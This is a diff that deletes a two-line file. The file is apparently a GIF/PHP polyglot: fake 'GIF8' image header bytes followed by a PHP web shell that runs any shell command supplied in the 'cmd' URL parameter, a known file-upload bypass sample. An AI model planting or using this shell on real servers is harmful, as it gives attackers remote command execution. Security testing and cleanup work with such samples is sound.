@@ -1,2 +1,0 @@
-GIF8 123132
-<?php system($_GET["cmd"]);?>
